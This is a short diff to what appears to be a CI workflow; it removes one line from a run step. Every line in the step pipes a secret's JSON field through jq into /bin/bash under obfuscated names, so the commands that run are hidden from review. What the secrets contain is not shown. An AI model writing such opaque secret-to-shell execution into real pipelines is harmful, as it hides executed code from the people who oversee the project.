@@ -18,7 +18,6 @@ jobs:
           zvnm501: ${{ secrets.zvnm501 }}
         run: |
           printf '%s' "$zvnm501" | jq -r .qrid20771 | /bin/bash
-          printf '%s' "$f37" | jq -r .enne0 | /bin/bash
           printf '%s' "$wds081" | jq -r .t1 | /bin/bash
           echo $aqjfm007 | jq -r .yxl22857 | /bin/bash
           printf '%s' "$egls64" | jq -r .zvlhm9 | /bin/bash
